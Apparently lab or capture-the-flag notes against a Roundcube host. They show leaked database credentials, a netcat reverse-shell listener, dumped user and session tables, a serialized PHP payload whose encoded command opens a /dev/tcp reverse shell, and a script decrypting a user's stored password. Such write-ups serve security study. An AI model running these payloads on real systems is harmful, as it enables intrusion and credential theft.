



```python

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCDBPass2025@localhost/roundcube';



// This key is used to encrypt the users imap password which is stored                                    
// in the session record. For the default cipher method it must be                                        
// exactly 24 characters long.                       
// YOUR KEY MUST BE DIFFERENT THAN THE SAMPLE VALUE FOR SECURITY REASONS                                  
$config['des_key'] = 'rcmail-!24ByteDESkey*Str';                                                          

```



```python
kali@kali ~ [1]> rlwrap -crA nc -lvnp 8443
listening on [any] 8443 ...
connect to [10.10.14.194] from (UNKNOWN) [10.129.221.89] 38062
/bin/sh: 0: can't access tty; job control turned off
$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "SELECT * FROM USERS;"
--------------
SELECT * FROM USERS
--------------

ERROR 1146 (42S02) at line 1: Table 'roundcube.USERS' doesn't exist
$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "SELECT * FROM users;"
user_id username        mail_host       created last_login      failed_login    failed_login_counter    language        preferences
1       jacob   localhost       2025-06-07 13:55:18     2025-06-11 07:52:49     2025-06-11 07:51:32     1       en_US   a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
2       mel     localhost       2025-06-08 12:04:51     2025-06-08 13:29:05     NULL    NULL    en_US   a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
3       tyler   localhost       2025-06-08 13:28:55     2025-07-12 21:48:42     2025-06-11 07:51:22     1       en_US   a:3:{s:14:"message_extwin";i:0;s:18:"message_show_email";b:1;s:11:"client_hash";s:16:"Y2Rz3HTwxwLJHevI";}

```







```
$ mysql -u roundcube -pRCDBPass2025 -h localhost roundcube -e "SELECT * FROM session;"                                                                                                                              
sess_id changed ip      vars                                                                                                                                                                                        
2ijlnh5psiqmutdjt0lambai6h      2025-07-12 21:46:09     172.17.0.1      dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3
aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3Nz
IjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRh
cmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiI2MkNlMm94cXZ0QkhlUVpYTGVIbkhhclo1Z2o1V3EzNSI7
6a5ktqih5uca6lj8vrmgh9v0oh      2025-06-08 15:46:40     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVy
IjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjE7dXNlcm5hbWV8czo1OiJqYWNvYiI7c3RvcmFnZV9ob3N0fHM6OToibG9j
YWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJ
QUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVk
X2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlv
biI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6
InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVO
Q0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xJU1QtRVhURU5ERUR8YjoxO2xpc3RfYXR0cmlifGE6Njp7czo0OiJuYW1lIjtzOjg6Im1lc3NhZ2VzIjtzOjI6ImlkIjtzOjExOiJtZXNzYWdlbGlz
dCI7czo1OiJjbGFzcyI7czo0MjoibGlzdGluZyBtZXNzYWdlbGlzdCBzb3J0aGVhZGVyIGZpeGVkaGVhZGVyIjtzOjE1OiJhcmlhLWxhYmVsbGVkYnkiO3M6MjI6ImFyaWEtbGFiZWwtbWVzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6
ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1s
aXN0X21vZF9zZXF8czoyOiIxMCI7
7v26qloq08ab0p6u17ttcq6nea      2025-07-12 21:48:27     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVy
IjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9j
YWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6IlVaUEZ2UkxTOHZuY0Fkd2hQUGhObHBMaklrcmpGL2w3Ijtsb2dpbl90aW1lfGk6MTc1MjM1NjkwNzt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9T
UEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoidFB5NFI3bXBXTmM0Q1JwT2ZCN1FicWJLdHkiO3JlcXVlc3RfdG9rZW58czozMjoiN3NnRE5nV3UzeGpNbm9SOWlCVkp4SUE1VDVDd25BQ3kiOw==
964q3ni37vvdl7r0m6rgj2pf5j      2025-07-12 21:48:27     172.17.0.1      dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3
aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3Nz
IjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRh
cmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJORnk3cjB6VmU4WlJaTDhLdHJYTTBHMTF5Y2tuRmNldSI7
brluo9t3sja1alsfpnd3qirai1      2025-07-12 21:48:23     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVy
IjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9j
YWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6ImdHYW1UbnRWVUdSWmJibzViMHVEaVp5WHlCUncxZ3ZzIjtsb2dpbl90aW1lfGk6MTc1MjM1Njc3MDt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9T
UEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoiUWFvQVNEaXk5V2kxaTZyZWxYWkxJT01yQ3oiO3JlcXVlc3RfdG9rZW58czozMjoiVGM2QTFjUUhtNXFJdU9GS0hQa00yaWFXM0Y4eEdRMXIiO3BsdWdpbnN8YToxOntzOjIyOiJmaWxlc3lzdGVtX2F0dGFjaG1lbnRzIjth
OjE6e3M6NDoiIXh4eCI7YToxOntzOjIwOiIzMTc1MjM1Njc3MDA0NzM2NzAwMCI7czo2NDoiL3Zhci93d3cvaHRtbC9yb3VuZGN1YmUvdGVtcC9SQ01URU1QYXR0bW50Njg3MmQ3YTI3MzhjODI2MjU4MDcwMyI7fX19eHh4fE47MTp7czo1OiJmaWxlcyI7YToxOntzOjIwOiIzMTc1
MjM1Njc3MDA0NzM2NzAwMCI7YTo2OntzOjQ6InBhdGgiO3M6NjQ6Ii92YXIvd3d3L2h0bWwvcm91bmRjdWJlL3RlbXAvUkNNVEVNUGF0dG1udDY4NzJkN2EyNzM4YzgyNjI1ODA3MDMiO3M6NDoic2l6ZSI7aTo1NjM7czo0OiJuYW1lIjtzOjIzNzoifE86MTY6IkNyeXB0X0dQR19F
bmdpbmUiOjMwOntzOjI1OiIAQ3J5cHRfR1BHX0VuZ2luZQBfc3RyaWN0IjtiOjA7czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX2RlYnVnIjtiOjA7czoyNToiAENyeXB0X0dQR19FbmdpbmUAX2JpbmFyeSI7czowOiIiO3M6MjQ6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudCI7czow
OiIiO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF9ncGdjb25mIjtzOjE0MjoiZWNobyAiWldOb2J5Qk1Na3B3WW1rNWVtRkRRWFJoVTBFclNtbEJkbHBIVmpKTU0xSnFZME00ZUUxRE5IaE5RelI0VGtNMGVFOVVVWFpQUkZFd1RYbEJkMUJwV1hnZ2ZDQmlZWE5sTmpRZ0xXUWdmQ0F2
WW1sdUwySmhjMmc9InxiYXNlNjQgLWR8c2g7IyI7czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX2hvbWVkaXIiO3M6MDoiIjtzOjMyOiIAQ3J5cHRfR1BHX0VuZ2luZQBfcHVibGljS2V5cmluZyI7czowOiIiO3M6MzM6IgBDcnlwdF9HUEdfRW5naW5lAF9wcml2YXRlS2V5cmluZyI7
czowOiIiO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF90cnVzdERiIjtzOjA6IiI7czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX3BpcGVzIjthOjA6e31zOjI5OiIAQ3J5cHRfR1BHX0VuZ2luZQBfYWdlbnRQaXBlcyI7YTowOnt9czoyODoiAENyeXB0X0dQR19FbmdpbmUAX29wZW5Q
aXBlcyI7YTowOnt9czoyNjoiAENyeXB0X0dQR19FbmdpbmUAX3Byb2Nlc3MiO2I6MDtzOjMxOiIAQ3J5cHRfR1BHX0VuZ2luZQBfYWdlbnRQcm9jZXNzIjtOO3M6Mjg6IgBDcnlwdF9HUEdfRW5naW5lAF9hZ2VudEluZm8iO047czoyNzoiAENyeXB0X0dQR19FbmdpbmUAX2lzRGFy
d2luIjtiOjA7czozMDoiAENyeXB0X0dQR19FbmdpbmUAX2RpZ2VzdF9hbGdvIjtOO3M6MzA6IgBDcnlwdF9HUEdfRW5naW5lAF9jaXBoZXJfYWxnbyI7TjtzOjMyOiIAQ3J5cHRfR1BHX0VuZ2luZQBfY29tcHJlc3NfYWxnbyI7TjtzOjI2OiIAQ3J5cHRfR1BHX0VuZ2luZQBfb3B0
aW9ucyI7YTowOnt9czozMjoiAENyeXB0X0dQR19FbmdpbmUAX2NvbW1hbmRCdWZmZXIiO3M6MDoiIjtzOjMzOiIAQ3J5cHRfR1BHX0VuZ2luZQBfcHJvY2Vzc0hhbmRsZXIiO047czozMzoiAENyeXB0X0dQR19FbmdpbmUAX3N0YXR1c0hhbmRsZXJzIjthOjA6e31zOjMyOiIAQ3J5
cHRfR1BHX0VuZ2luZQBfZXJyb3JIYW5kbGVycyI7YTowOnt9czoyNDoiAENyeXB0X0dQR19FbmdpbmUAX2lucHV0IjtOO3M6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF9tZXNzYWdlIjtOO3M6MjU6IgBDcnlwdF9HUEdfRW5naW5lAF9vdXRwdXQiO3M6MDoiIjtzOjI4OiIAQ3J5cHRf
R1BHX0VuZ2luZQBfb3BlcmF0aW9uIjtOO3M6Mjg6IgBDcnlwdF9HUEdfRW5naW5lAF9hcmd1bWVudHMiO2E6MDp7fXM6MjY6IgBDcnlwdF9HUEdfRW5naW5lAF92ZXJzaW9uIjtzOjA6IiI7fQ==
dputst745nffbqgvlg0csnj4np      2025-07-12 21:46:10     172.17.0.1      dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3
aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3Nz
IjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRh
cmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJZcGVZb0RmNzFEZU90Q3o2RlpCVVBWOHJRTWtCTFlpdiI7
ds1v8fpnhte54md91gd73hq0e6      2025-07-12 21:48:42     172.17.0.1      bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLyI7fX1zOjU6Im90aGVy
IjtOO3M6Njoic2hhcmVkIjtOO3M6MTA6InByZWZpeF9vdXQiO3M6MDoiIjt9aW1hcF9kZWxpbWl0ZXJ8czoxOiIvIjtpbWFwX2xpc3RfY29uZnxhOjI6e2k6MDtOO2k6MTthOjA6e319dXNlcl9pZHxpOjM7dXNlcm5hbWV8czo1OiJ0eWxlciI7c3RvcmFnZV9ob3N0fHM6OToibG9j
YWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Im4xZnVHUjVBMjI2Z1Q3ZWRoSHpFc1BudElraGU1eE1YIjtsb2dpbl90aW1lfGk6MTc1MjM1NjkyMjt0aW1lem9uZXxzOjE3OiJBbWVyaWNhL1Nhb19QYXVsbyI7U1RPUkFHRV9T
UEVDSUFMLVVTRXxiOjE7YXV0aF9zZWNyZXR8czoyNjoiR3RTOHBYcVpsNEhUejR0cFloSDRjRVNuQXIiO3JlcXVlc3RfdG9rZW58czozMjoibjJMRVdMRHFmeWdLWjRQVlhnUlgxaEdLU1JUSnBYMUciOw==
hsbou33dh1ptr51r2h3tpr30kl      2025-07-12 21:48:42     172.17.0.1      dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3
aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3Nz
IjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRh
cmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJaNVF1aUFkRmU1cTMwSlFsc3R2SEFtZkhTQUJVQ0FPbyI7
o7qh8hnrcph1qfgem09hn1u9i1      2025-07-12 21:48:26     172.17.0.1      dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3
aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3Nz
IjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRh
cmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiI1Z0FQM0Zzb2VEYzVRamQ3U1dXRDNad0w1eDZES1REWCI7
urtj2cek9je9ibdhjdo1uchjan      2025-07-12 21:48:41     172.17.0.1      dGVtcHxiOjE7bGFuZ3VhZ2V8czo1OiJlbl9VUyI7dGFza3xzOjU6ImxvZ2luIjtza2luX2NvbmZpZ3xhOjc6e3M6MTc6InN1cHBvcnRlZF9sYXlvdXRzIjthOjE6e2k6MDtzOjEwOiJ3
aWRlc2NyZWVuIjt9czoyMjoianF1ZXJ5X3VpX2NvbG9yc190aGVtZSI7czo5OiJib290c3RyYXAiO3M6MTg6ImVtYmVkX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTk6ImVkaXRvcl9jc3NfbG9jYXRpb24iO3M6MTc6Ii9zdHlsZXMvZW1iZWQuY3Nz
IjtzOjE3OiJkYXJrX21vZGVfc3VwcG9ydCI7YjoxO3M6MjY6Im1lZGlhX2Jyb3dzZXJfY3NzX2xvY2F0aW9uIjtzOjQ6Im5vbmUiO3M6MjE6ImFkZGl0aW9uYWxfbG9nb190eXBlcyI7YTozOntpOjA7czo0OiJkYXJrIjtpOjE7czo1OiJzbWFsbCI7aToyO3M6MTA6InNtYWxsLWRh
cmsiO319cmVxdWVzdF90b2tlbnxzOjMyOiJCaVpMWmp6TnNpV0V0cnc5TXlZaWwwaTFuVTg4WE91eiI7
```




```python
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:3;username|s:5:"tyler";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"gGamTntVUGRZbbo5b0uDiZyXyBRw1gvs";login_time|i:1752356770;timezone|s:17:"America/Sao_Paulo";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"QaoASDiy9Wi1i6relXZLIOMrCz";request_token|s:32:"Tc6A1cQHm5qIuOFKHPkM2iaW3F8xGQ1r";plugins|a:1:{s:22:"filesystem_attachments";a:1:{s:4:"!xxx";a:1:{s:20:"31752356770047367000";s:64:"/var/www/html/roundcube/temp/RCMTEMPattmnt6872d7a2738c8262580703";}}}xxx|N;1:{s:5:"files";a:1:{s:20:"31752356770047367000";a:6:{s:4:"path";s:64:"/var/www/html/roundcube/temp/RCMTEMPattmnt6872d7a2738c8262580703";s:4:"size";i:563;s:4:"name";s:237:"|O:16:"Crypt_GPG_Engine":30:{s:25:"Crypt_GPG_Engine_strict";b:0;s:24:"Crypt_GPG_Engine_debug";b:0;s:25:"Crypt_GPG_Engine_binary";s:0:"";s:24:"Crypt_GPG_Engine_agent";s:0:"";s:26:"Crypt_GPG_Engine_gpgconf";s:142:"echo "ZWNobyBMMkpwYmk5emFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE1DNHhNQzR4TkM0eE9UUXZPRFEwTXlBd1BpWXggfCBiYXNlNjQgLWQgfCAvYmluL2Jhc2g="|base64 -d|sh;#";s:26:"Crypt_GPG_Engine_homedir";s:0:"";s:32:"Crypt_GPG_Engine_publicKeyring";s:0:"";s:33:"Crypt_GPG_Engine_privateKeyring";s:0:"";s:26:"Crypt_GPG_Engine_trustDb";s:0:"";s:24:"Crypt_GPG_Engine_pipes";a:0:{}s:29:"Crypt_GPG_Engine_agentPipes";a:0:{}s:28:"Crypt_GPG_Engine_openPipes";a:0:{}s:26:"Crypt_GPG_Engine_process";b:0;s:31:"Crypt_GPG_Engine_agentProcess";N;s:28:"Crypt_GPG_Engine_agentInfo";N;s:27:"Crypt_GPG_Engine_isDarwin";b:0;s:30:"Crypt_GPG_Engine_digest_algo";N;s:30:"Crypt_GPG_Engine_cipher_algo";N;s:32:"Crypt_GPG_Engine_compress_algo";N;s:26:"Crypt_GPG_Engine_options";a:0:{}s:32:"Crypt_GPG_Engine_commandBuffer";s:0:"";s:33:"Crypt_GPG_Engine_processHandler";N;s:33:"Crypt_GPG_Engine_statusHandlers";a:0:{}s:32:"Crypt_GPG_Engine_errorHandlers";a:0:{}s:24:"Crypt_GPG_Engine_input";N;s:26:"Crypt_GPG_Engine_message";N;s:25:"Crypt_GPG_Engine_output";s:0:"";s:28:"Crypt_GPG_Engine_operation";N;s:28:"Crypt_GPG_Engine_arguments";a:0:{}s:26:"Crypt_GPG_Engine_version";s:0:"";}⏎
```




```python
language => "en_US"

imap_namespace => [
    personal => [
        [ "", "/" ]
    ],
    other => null,
    shared => null,
    prefix_out => ""
]

imap_delimiter => "/"

imap_list_conf => [
    0 => null,
    1 => []
]

user_id => 1
username => "jacob"
storage_host => "localhost"
storage_port => 143
storage_ssl => false

password => "L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"
login_time => 1749397119
timezone => "Europe/London"

STORAGE_SPECIAL-USE => true

auth_secret => "DpYqv6maI9HxDL5GhcCd8JaQQW"
request_token => "TIsOaABA1zHSXZOBpH6up5XFyayNRHaw"

task => "mail"

skin_config => [
    supported_layouts => ["widescreen"],
    jquery_ui_colors_theme => "bootstrap",
    embed_css_location => "/styles/embed.css",
    editor_css_location => "/styles/embed.css",
    dark_mode_support => true,
    media_browser_css_location => "none",
    additional_logo_types => [
        0 => "dark",
        1 => "small",
        2 => "small-dark"
    ]
]

imap_host => "localhost"
page => 1
mbox => "INBOX"
sort_col => ""
sort_order => "DESC"

STORAGE_THREAD => [
    0 => "REFERENCES",
    1 => "REFS",
    2 => "ORDEREDSUBJECT"
]

STORAGE_QUOTA => false
STORAGE_LIST-EXTENDED => true

list_attrib => [
    name => "messages",
    id => "messagelist",
    class => "listing messagelist sortheader fixedheader",
    aria-labelledby => "aria-label-messagelist",
    data-list => "message_list",
    data-label-msg => "The list is empty."
]

unseen_count => [
    INBOX => 2,
    Trash => 0
]

folders => [
    INBOX => [
        cnt => 2,
        maxuid => 3
    ]
]

list_mod_seq => "10"

```




```php
<?php
$encrypted_base64 = 'L7Rv00A8TuwJAr67kITxxcSgnIk25Am/';
$key = 'rcmail-!24ByteDESkey*Str'; // 24-byte key

$method = 'des-ede3-cbc'; // 3DES CBC

$cipher_raw = base64_decode($encrypted_base64);

$iv_len = openssl_cipher_iv_length($method); // should be 8 bytes

$iv = substr($cipher_raw, 0, $iv_len);
$ciphertext = substr($cipher_raw, $iv_len);

$decrypted = openssl_decrypt($ciphertext, $method, $key, OPENSSL_RAW_DATA, $iv);

if ($decrypted === false) {
    echo "Decryption failed\n";
} else {
    echo "Decrypted password: " . $decrypted . "\n";
}
?>

```



```
jacob: 595mO8DmwGeD
```









https://security.opensuse.org/2025/03/12/below-world-writable-log-dir.html#2-symlink-attack-in-varlogbelowerror_rootlog

